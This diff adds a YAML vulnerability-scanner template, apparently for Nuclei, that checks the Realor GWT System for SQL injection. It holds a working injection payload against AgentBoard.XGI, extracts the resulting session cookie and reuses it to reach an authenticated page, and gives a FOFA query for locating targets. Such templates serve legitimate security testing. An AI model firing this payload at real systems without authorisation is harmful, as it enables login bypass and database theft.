@@ -1,0 +1,43 @@
+id: realor-gwt-system-sqli
+
+info:
+  name: Realor GWT System SQL injection
+  author: SleepingBag945
+  severity: high
+  description: |
+    Realor GWT System system improperly handles the security of data passed by users, resulting in a SQL injection vulnerability. Remote and unauthorized attackers can use this vulnerability to obtain sensitive information in the database, and can further write webshell backdoors. Access, the attacker can execute arbitrary malicious code on the target server and gain system privileges.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/realor-gwt-system-sql-injection.yaml
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: "true"
+    max-request: 2
+    fofa-query: app="REALOR-天翼应用虚拟化系统"
+  tags: realor,sqli,vuln
+
+http:
+  - raw:
+      - |
+        GET /AgentBoard.XGI?user='||'1&cmd=UserLogin HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /Board.XGI HTTP/1.1
+        Cookie: PHPSESSID={{cookie}}
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        group: 1
+        regex:
+          - 'PHPSESSID=(.*?);'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"CustomInfo") && contains(header_1,"PHPSESSID")'
+          - 'contains(body_2,"src=\"custom/")'
+        condition: and
+# digest: 4a0a00473045022100981582612f842ffd8a8223598cf61f3839022131b32d0f67f1a45c615ea9c49502204d0b5fd5c21428494d78d6f499ac52762214cee57b6487e0ddac21a8b430a5b3:922c64590222798bb761d5b6d8e72950
